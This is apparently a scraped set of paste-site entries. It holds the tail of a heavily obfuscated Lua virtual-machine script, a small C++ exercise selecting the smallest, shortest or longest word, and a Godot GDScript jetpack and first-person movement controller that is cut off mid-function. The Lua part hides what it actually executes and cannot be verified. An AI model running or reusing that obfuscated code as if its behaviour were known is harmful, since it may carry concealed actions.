;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v191=v80[2];v78[v191]=v78[v191](v13(v78,v191 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v190=v80[3];v189=v78[v190];for v337=v190 + 1 ,v80[4] do v189=v189   .. v78[v337] ;end v78[v80[2]]=v189;elseif (v78[v80[2]]~=v80[4]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=18) then if (v81>17) then local v202=0;local v203;while true do if (v202==0) then v203=v80[2];v78[v203]=v78[v203](v13(v78,v203 + 1 ,v80[3]));break;end end else local v204=0;local v205;local v206;while true do if (v204==2) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v204=3;end if (v204==6) then v72=v72 + 1 ;v80=v68[v72];v206=v80[2];v78[v206](v13(v78,v206 + 1 ,v80[3]));v204=7;end if (v204==3) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v204=4;end if (v204==1) then v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v204=2;end if (v204==7) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];break;end if (v204==0) then v205=nil;v206=nil;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v204=1;end if (v204==5) then v78[v206]=v205[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v204=6;end if (v204==4) then v80=v68[v72];v206=v80[2];v205=v78[v80[3]];v78[v206 + 1 ]=v205;v204=5;end end end elseif (v81==19) then v78[v80[2]]=v78[v80[3]] -v80[4] ;else local v208=0;local v209;local v210;local v211;local v212;local v213;while true do if (0==v208) then v209=nil;v210=nil;v209,v211=nil;v212=nil;v213=nil;if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v208=1;end if (v208==5) then for v611=v213,v73 do v210=v210 + 1 ;v78[v611]=v209[v210];end v72=v72 + 1 ;v80=v68[v72];v213=v80[2];v209={v78[v213](v13(v78,v213 + 1 ,v73))};v210=0;v208=6;end if (4==v208) then v72=v72 + 1 ;v80=v68[v72];v213=v80[2];v209,v211=v71(v78[v213](v78[v213 + 1 ]));v73=(v211 + v213) -1 ;v210=0;v208=5;end if (v208==2) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v208=3;end if (1==v208) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v208=2;end if (v208==3) then v72=v72 + 1 ;v80=v68[v72];v213=v80[2];v212=v78[v80[3]];v78[v213 + 1 ]=v212;v78[v213]=v212[v80[4]];v208=4;end if (v208==6) then for v614=v213,v80[4] do v210=v210 + 1 ;v78[v614]=v209[v210];end v72=v72 + 1 ;v80=v68[v72];v72=v80[3];break;end end end elseif (v81<=23) then if (v81<=21) then local v120=v78[v80[4]];if  not v120 then v72=v72 + 1 ;else v78[v80[2]]=v120;v72=v80[3];end elseif (v81==22) then local v216=0;local v217;local v218;while true do if (v216==1) then v78[v217 + 1 ]=v218;v78[v217]=v218[v80[4]];break;end if (v216==0) then v217=v80[2];v218=v78[v80[3]];v216=1;end end else local v219;local v220;v220=v80[2];v78[v220]=v78[v220](v13(v78,v220 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v58[v80[3]];v72=v72 + 1 ;v80=v68[v72];v220=v80[2];v219=v78[v80[3]];v78[v220 + 1 ]=v219;v78[v220]=v219[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v220=v80[2];do return v78[v220](v13(v78,v220 + 1 ,v80[3]));end v72=v72 + 1 ;v80=v68[v72];v220=v80[2];do return v13(v78,v220,v73);end v72=v72 + 1 ;v80=v68[v72];v72=v80[3];end elseif (v81<=25) then if (v81>24) then local v230=v80[3];local v231=v78[v230];for v338=v230 + 1 ,v80[4] do v231=v231   .. v78[v338] ;end v78[v80[2]]=v231;elseif ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end elseif (v81==26) then v78[v80[2]]();elseif v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=41) then if (v81<=34) then if (v81<=30) then if (v81<=28) then v78[v80[2]][v80[3]]=v78[v80[4]];elseif (v81>29) then local v233=0;local v234;while true do if (v233==0) then v234=v80[2];v78[v234](v78[v234 + 1 ]);break;end end else local v235=0;local v236;local v237;while true do if (v235==6) then v80=v68[v72];v237=v80[2];v236=v78[v80[3]];v78[v237 + 1 ]=v236;v78[v237]=v236[v80[4]];v235=7;end if (2==v235) then v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v235=3;end if (v235==3) then v237=v80[2];v236=v78[v80[3]];v78[v237 + 1 ]=v236;v78[v237]=v236[v80[4]];v72=v72 + 1 ;v235=4;end if (v235==0) then v236=nil;v237=nil;if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v235=1;end if (v235==8) then v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v72=v80[3];break;end if (1==v235) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v237=v80[2];v78[v237](v78[v237 + 1 ]);v235=2;end if (v235==4) then v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v237=v80[2];v235=5;end if (v235==5) then v78[v237]=v78[v237](v13(v78,v237 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v235=6;end if (v235==7) then v72=v72 + 1 ;v80=v68[v72];v237=v80[2];v78[v237](v78[v237 + 1 ]);v72=v72 + 1 ;v235=8;end end end elseif (v81<=32) then if (v81==31) then v78[v80[2]]=v78[v80[3]][v80[4]];else local v240=0;while true do if (v240==3) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v240=4;end if (v240==1) then for v617=v80[2],v80[3] do v78[v617]=nil;end v72=v72 + 1 ;v80=v68[v72];v240=2;end if (v240==4) then v72=v80[3];break;end if (v240==0) then v58[v80[3]]=v78[v80[2]];v72=v72 + 1 ;v80=v68[v72];v240=1;end if (v240==2) then v58[v80[3]]=v78[v80[2]];v72=v72 + 1 ;v80=v68[v72];v240=3;end end end elseif (v81>33) then if (v80[2]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end else local v241=0;local v242;while true do if (v241==0) then v242=v80[2];v78[v242]=v78[v242](v78[v242 + 1 ]);break;end end end elseif (v81<=37) then if (v81<=35) then local v123=0;local v124;while true do if (0==v123) then v124=v80[2];v78[v124](v13(v78,v124 + 1 ,v80[3]));break;end end elseif (v81>36) then v72=v80[3];else v58[v80[3]]=v78[v80[2]];end elseif (v81<=39) then if (v81>38) then local v246=v80[2];do return v13(v78,v246,v73);end else local v247=0;while true do if (v247==0) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v247=1;end if (v247==9) then v72=v80[3];break;end if (v247==1) then v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v247=2;end if (v247==6) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v247=7;end if (v247==3) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v247=4;end if (7==v247) then v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v247=8;end if (v247==4) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v247=5;end if (v247==2) then if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v247=3;end if (v247==8) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v247=9;end if (v247==5) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v247=6;end end end elseif (v81>40) then if (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end else local v248;local v249;local v248,v250;local v251;local v252;if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v252=v80[2];v251=v78[v80[3]];v78[v252 + 1 ]=v251;v78[v252]=v251[v80[4]];v72=v72 + 1 ;v80=v68[v72];v252=v80[2];v248,v250=v71(v78[v252](v78[v252 + 1 ]));v73=(v250 + v252) -1 ;v249=0;for v340=v252,v73 do local v341=0;while true do if (v341==0) then v249=v249 + 1 ;v78[v340]=v248[v249];break;end end end v72=v72 + 1 ;v80=v68[v72];v252=v80[2];v248={v78[v252](v13(v78,v252 + 1 ,v73))};v249=0;for v342=v252,v80[4] do v249=v249 + 1 ;v78[v342]=v248[v249];end v72=v72 + 1 ;v80=v68[v72];v72=v80[3];end elseif (v81<=48) then if (v81<=44) then if (v81<=42) then v78[v80[2]]=v58[v80[3]];elseif (v81>43) then v78[v80[2]]=v80[3]~=0 ;else local v263;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v263=v80[2];v78[v263](v78[v263 + 1 ]);v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v58[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]();v72=v72 + 1 ;v80=v68[v72];v72=v80[3];end elseif (v81<=46) then if (v81==45) then v78[v80[2]]=v78[v80[3]];else local v272;v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v272=v80[2];v78[v272]=v78[v272](v78[v272 + 1 ]);v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];for v345=v80[2],v80[3] do v78[v345]=nil;end v72=v72 + 1 ;v80=v68[v72];v72=v80[3];end elseif (v81>47) then v78[v80[2]]=v80[3];else local v282=0;local v283;while true do if (v282==5) then v80=v68[v72];v283=v80[2];v78[v283]=v78[v283](v13(v78,v283 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v78[v80[4]];v72=v72 + 1 ;v80=v68[v72];v282=6;end if (v282==8) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];break;end if (1==v282) then v78[v283](v78[v283 + 1 ]);v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v58[v80[3]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v282=2;end if (v282==3) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v282=4;end if (v282==2) then v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v282=3;end if (v282==4) then v78[v80[2]]=v78[v80[3]] -v80[4] ;v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v282=5;end if (v282==0) then v283=nil;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v283=v80[2];v282=1;end if (v282==7) then v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v80[4];v282=8;end if (v282==6) then if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v282=7;end end end elseif (v81<=52) then if (v81<=50) then if (v81>49) then local v284;local v285;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v285=v80[2];v284=v78[v80[3]];v78[v285 + 1 ]=v284;v78[v285]=v284[v80[4]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v285=v80[2];v78[v285]=v78[v285](v13(v78,v285 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];else local v294;if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v78[v80[4]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v294=v80[2];v78[v294]=v78[v294](v13(v78,v294 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v78[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];end elseif (v81==51) then local v303=0;local v304;local v305;local v306;local v307;local v308;while true do if (v303==6) then v305=0;for v621=v308,v73 do v305=v305 + 1 ;v78[v621]=v304[v305];end v72=v72 + 1 ;v80=v68[v72];v303=7;end if (1==v303) then v308=nil;v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v303=2;end if (v303==3) then if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v308=v80[2];v303=4;end if (v303==4) then v307=v78[v80[3]];v78[v308 + 1 ]=v307;v78[v308]=v307[v80[4]];v72=v72 + 1 ;v303=5;end if (v303==5) then v80=v68[v72];v308=v80[2];v304,v306=v71(v78[v308](v78[v308 + 1 ]));v73=(v306 + v308) -1 ;v303=6;end if (v303==2) then v308=v80[2];v78[v308](v78[v308 + 1 ]);v72=v72 + 1 ;v80=v68[v72];v303=3;end if (v303==0) then v304=nil;v305=nil;v304,v306=nil;v307=nil;v303=1;end if (v303==7) then v308=v80[2];v304={v78[v308](v13(v78,v308 + 1 ,v73))};v305=0;for v624=v308,v80[4] do local v625=0;while true do if (v625==0) then v305=v305 + 1 ;v78[v624]=v304[v305];break;end end end v303=8;end if (8==v303) then v72=v72 + 1 ;v80=v68[v72];v72=v80[3];break;end end elseif (v78[v80[2]]~=v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=54) then if (v81==53) then local v309=0;local v310;while true do if (v309==7) then v310=v80[2];v78[v310]=v78[v310](v13(v78,v310 + 1 ,v80[3]));break;end if (v309==4) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v309=5;end if (v309==6) then v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v309=7;end if (2==v309) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v78[v80[4]];v72=v72 + 1 ;v309=3;end if (v309==0) then v310=nil;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v309=1;end if (v309==1) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v309=2;end if (3==v309) then v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v309=4;end if (v309==5) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v309=6;end end else local v311=v80[2];local v312={};for v347=1, #v77 do local v348=v77[v347];for v404=0, #v348 do local v405=0;local v406;local v407;local v408;while true do if (v405==0) then v406=v348[v404];v407=v406[1];v405=1;end if (v405==1) then v408=v406[2];if ((v407==v78) and (v408>=v311)) then v312[v408]=v407[v408];v406[1]=v312;end break;end end end end end elseif (v81==55) then for v349=v80[2],v80[3] do v78[v349]=nil;end else local v313=0;local v314;while true do if (v313==0) then v314=v80[2];do return v78[v314](v13(v78,v314 + 1 ,v80[3]));end break;end end end v72=v72 + 1 ;break;end end end end;end return v30(v29(),{},v17)(...);end if (v18==1) then v21=nil;function v21(v63,v64,v65)if v65 then local v86=(v63/(((343 -(218 + 123)) + 0)^(v64-((1582 -(1535 + 46)) -0))))%((2 -0)^(((v65-(1 + 0)) -(v64-1)) + 1)) ;return v86-(v86%(1 + 0)) ;else local v87=(1 + 1)^(v64-(1637 -(1373 + 263))) ;return (((v63%(v87 + v87))>=v87) and (1001 -(451 + 549))) or (0 -0) ;end end v22=nil;v18=2;end end end v15(""LOL!"",v9(),...);"
jVJGirmk,1. MinBy,Spocoman,C++,Monday 29th of January 2024 09:37:40 AM CDT,"#include <iostream>
#include <sstream>
#include <string>
#include <vector>

using namespace std;

void minLexicographical(vector<string>& v) {
    string result = v[0];
    for (auto& el : v) {
        if (result > el) {
            result = el;
        }
    }
    cout << result << endl;

}void minLength(vector<string>& v) {
    string result = v[0];
    for (auto& el : v) {
        if (result.length() > el.length()) {
            result = el;
        }
    }
    cout << result << endl;
}
void maxLength(vector<string>& v) {
    string result = v[0];
    for (auto& el : v) {
        if (result.length() < el.length()) {
            result = el;
        }
    }
    cout << result << endl;
}

int main()
{
    string line, word;
    getline(cin, line);

    istringstream ss(line);

    vector<string> words;

    while (ss >> word) {
        words.push_back(word);
    }

    int n;
    cin >> n;

    n == 1 ? minLexicographical(words) : n == 2 ? minLength(words) : maxLength(words);

    return 0;
}"
Aza2ucQ1,Godot 3D Jetpack + First Person Movement + Head bobbing,CirilXD,GDScript,Monday 29th of January 2024 09:32:11 AM CDT,"extends CharacterBody3D

enum WalkState{
	NORMAL,
	SPRINT,
	CROUCH,
	PRONE,
	SLIDE,
	JETPACK
}

#movement attribute values
const TARGET_LERP = .8
const JETPACK_TARGER_LERP = .6

const SPRINT_SPEED = 10.0
const SPRINT_LERP_ACC = 2.0
const SPRINT_LERP_DEC = 8.0

const WALK_SPEED = 6.0
const WALK_LERP_ACC = 3.5
const WALK_LERP_DEC = 10.0

const CROUCH_SPEED = 3.0
const CROUCH_LERP_ACC = 8.0
const CROUCH_LERP_DEC = 14.0

const PRONE_SPEED = 1.5
const PRONE_LERP_ACC = 12.0
const PRONE_LERP_DEC = 22.0

const JETPACK_SPEED = 6.0
const JETPACK_LERP_ACC = 6.0
const JETPACK_LERP_DEC = 12.0
const JETPACK_VERTICAL_FORCE = 5.0
const JETPACK_VERTICAL_VELOCITY_MAX = 2.5
const JETPACK_VERTICAL_DIFFERENCE_MAX = 5.0
var current_jetpack_vertical = 0.0
const JETPACK_VELOCITY_THRESHOLD = .5
const ENERGY_MAX = 100.0
const ENERGY_DRAIN_JETPACK_START = 10
const ENERGY_DRAIN_JETPACK_MULT = 10.0
const ENERGY_DRAIN_SPRINT_MULT = 5.0
const ENERGY_REGEN_MULT = 30.0
const ENERGY_REGEN_COOLDOWN = 2.5
var current_energy_regen_cooldown = 0.0
var current_energy = ENERGY_MAX
const JETPACK_START_TIMER = 0.65
var current_jetpack_start_timer = 0

const SLIDE_SPEED = 30
const SLIDE_TIME_MAX = .7
const SLIDE_DAMPEN_RATE = .05
const SLIDE_FLAT_DAMPEN_RATE = .001
const SLOPE_SLIDE_THRESHOLD = .1
var current_slide_time = 0
var current_slide_vector : Vector3 = Vector3.ZERO

var SPRINT_CD_MAX = .2
var current_sprint_cd = 0

const FALL_SPEED_MAX = 15
const JUMP_VELOCITY = 6
const JUMP_HANG_TIME_THRESHOLD = .3
const JUMP_HANG_TIME_SPEED_MULT = 1.05
const JUMP_HANG_TIME_ACC_MULT = 3

const COYOTE_TIME_MAX = .1
var current_coyote_time = 0
const JUMP_CD_MAX = .25
var current_jump_cd = 0



# Get the gravity from the project settings to be synced with RigidBody nodes.
var gravity_default = ProjectSettings.get_setting(""physics/3d/default_gravity"")
var gravity_falling = 2 * gravity_default
var gravity_hang_time = .5 * gravity_default
var current_gravity = gravity_default

@export var camera_sensitivity = .25

var input_dir = Vector2.ZERO
var direction = Vector3.ZERO

@onready var collider = $Collider
const COLLIDER_HEIGHT_NORMAL = 2
const COLLIDER_HEIGHT_CROUCH = 1.1
const COLLIDER_HEIGHT_PRONE = .5

const CAMERA_HEIGHT_NORMAL = 1.8
const CAMERA_HEIGHT_CROUCH = .9
const CAMERA_HEIGHT_PRONE = .3

const HEAD_BOB_INTENSITY_SPRINT = .15
const HEAD_BOB_INTENSITY_NORMAL = .12
const HEAD_BOB_INTENSITY_CROUCH = .08
const HEAD_BOB_INTENSITY_PRONE = .04

const HEAD_BOB_FREQUENCY_SPRINT = 18
const HEAD_BOB_FREQUENCY_NORMAL = 14
const HEAD_BOB_FREQUENCY_CROUCH = 10
const HEAD_BOB_FREQUENCY_PRONE = 8

const HEAD_BOB_LERP_RATE = 50

var head_bob_var = 0
var is_head_bob_active = true
var current_head_bob_intensity = 0
var current_head_bob_frequency = 0

const CAMERA_LERP = 10
const CAMERA_FOV_NORMAL = 70.0
const CAMERA_FOV_MAX_SPEED = 100.0

@onready var camera_pivot = $CameraPivot
@onready var debug_label = $DebugLabel
@onready var energy_bar = $EnergyBar
@onready var energy_bar_bar = $EnergyBar/Bar
@onready var energy_bar_label = $EnergyBar/Bar/Label
@onready var height_raycast = $HeightRaycast
@onready var camera_3d = $CameraPivot/HeadBobPivot/Camera3D
@onready var head_bob_pivot = $CameraPivot/HeadBobPivot
@onready var jetpack_stream = $jetpackStream

var current_max_speed : float = 0 
var current_lerp_acc : float = 0
var current_lerp_dec : float = 0
var current_camera_height : float = 0


const JETPACK_VOLUME_LERP_MULT = 5
const JETPACK_STREAM_STOP_THRESHOLD = .01

var current_walk_state : WalkState = WalkState.NORMAL


var floor_angle

var debug = null
var debug1 = null
var debug2 = null
var debug3 = null

func _ready():
	Input.set_mouse_mode(Input.MOUSE_MODE_CAPTURED)
	_UpdateCollider()
	debug =  get_tree().root.get_node(""ROOT/raycasts"")
	debug1 = debug.get_node(""DebugRaycast"")
	debug2 = debug.get_node(""DebugRaycast2"")
	debug3 = debug.get_node(""DebugRaycast3"")
	floor_angle = 0
	
	energy_bar_bar.min_value = 0
	energy_bar_bar.max_value = ENERGY_MAX
	_UpdateEnergyLabel()
	
func _input(event):
	if event is InputEventMouseMotion:
		rotate_y(deg_to_rad(camera_sensitivity * -event.relative.x))
		camera_pivot.rotate_x(deg_to_rad(camera_sensitivity * -event.relative.y))
		camera_pivot.rotation.x = clamp(camera_pivot.rotation.x, deg_to_rad(-89), deg_to_rad(89))


func _process(delta):
	input_dir = Input.get_vector(""left"", ""right"", ""forward"", ""back"")

	direction = transform.basis * Vector3(input_dir.x, 0, input_dir.y).normalized()

	if WalkState.SLIDE != current_walk_state && WalkState.JETPACK != current_walk_state:
		if Input.is_action_pressed(""prone"") && is_on_floor():
			if current_walk_state != WalkState.PRONE:
				current_walk_state = WalkState.PRONE
				_UpdateCollider()
		elif Input.is_action_pressed(""crouch"") and !height_raycast.is_colliding() && is_on_floor():
			if current_walk_state != WalkState.CROUCH:
				if current_sprint_cd > 0:
					current_walk_state = WalkState.SLIDE
					current_slide_time = SLIDE_TIME_MAX
					current_slide_vector = abs(velocity) * direction
					current_slide_vector.y = 0
					_UpdateCollider()
				else:
					current_walk_state = WalkState.CROUCH
					_UpdateCollider()
		elif !height_raycast.is_colliding():
			if current_walk_state == WalkState.PRONE:
				current_walk_state = WalkState.CROUCH
				_UpdateCollider()
			elif Input.is_action_pressed(""sprint""):
				current_sprint_cd = SPRINT_CD_MAX
				if current_walk_state != WalkState.SPRINT:
					current_walk_state = WalkState.SPRINT
					_UpdateCollider()
			elif current_walk_state != WalkState.NORMAL:
				current_walk_state = WalkState.NORMAL
				_UpdateCollider()
				
	floor_angle = get_floor_angle()
	
	_UpdateEnergyLabel()


func _physics_process(delta):
	if WalkState.SLIDE == current_walk_state:
		if current_slide_time > 0:
			if floor_angle < SLOPE_SLIDE_THRESHOLD || velocity.y > 0:
				current_slide_time -= delta
				current_slide_time = clamp(current_slide_time, 0, SLIDE_TIME_MAX)
			
		else:
			current_walk_state = WalkState.CROUCH
			_UpdateCollider()
	
	if current_sprint_cd > 0:
		current_sprint_cd -= delta

	#calc target speed based on current input
	var target_speed : Vector3 = direction * current_max_speed

	var current_acc_rate : Vector3 = Vector3.ZERO
	if input_dir:
		current_acc_rate = Vector3(current_lerp_acc,
				0,
				current_lerp_acc)
	else:
		current_acc_rate = Vector3(current_lerp_dec,
			0,
			current_lerp_dec)
	
	
	#lerp the target speed for smoother change
	#if the movement is in the same direction make the target closer to the current velocity
	#otherwise, since direction shift is required make the target closer to actual target
	#if player is faster than top speed don't slow down on X and Z axis
	if (target_speed.x != 0 &&
		abs(velocity.x) >= abs(target_speed.x) &&
		sign(velocity.x) == sign(target_speed.x)):
			
		target_speed.x = lerp(velocity.x, target_speed.x, 1-TARGET_LERP)
	else:
		target_speed.x = lerp(velocity.x, target_speed.x, TARGET_LERP)
		
	if (target_speed.z != 0 &&
		abs(velocity.z) >= abs(target_speed.z) &&
		sign(velocity.z) == sign(target_speed.z)):

